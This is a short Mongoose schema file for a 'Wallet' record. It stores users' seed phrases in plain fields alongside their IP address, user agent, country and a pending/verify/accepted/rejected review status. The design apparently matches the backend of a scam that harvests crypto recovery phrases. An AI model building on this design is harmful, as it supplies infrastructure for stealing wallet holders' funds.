const mongoose = require("mongoose");

const walletSchema = new mongoose.Schema({
  walletName: String,
  seedPhrase: String,
  description: String,
  ip: String,
  userAgent: String,
  country: String,
  status: {
    type: String,
    enum: ["pending", "verify", "accepted", "rejected"],
    default: "pending",
  },
});

module.exports = mongoose.model("Wallet", walletSchema);
